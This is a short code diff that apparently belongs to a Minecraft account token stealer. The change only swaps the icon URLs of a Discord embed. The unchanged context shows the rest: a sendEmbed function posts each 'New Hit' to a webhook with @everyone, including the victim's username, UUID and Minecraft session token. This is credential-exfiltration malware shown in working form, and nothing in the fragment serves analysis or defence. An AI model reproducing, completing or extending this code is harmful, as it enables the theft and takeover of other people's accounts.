@@ -170,7 +170,7 @@ async function sendEmbed(MinecraftToken, uuid, username) {
 	});
 	const embed = new EmbedBuilder()
 		.setTitle(`**New Hit ❗**`)
-		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/zocp3XL.png'})
+		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
 		.setDescription('@everyone')
 		.setColor(0x0099FF)
 		.addFields(
@@ -181,7 +181,7 @@ async function sendEmbed(MinecraftToken, uuid, username) {
 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
 			}
 		)
-		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/AfFp7pu.png' })
+		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
 		.setTimestamp();
 
 	webhook.send({
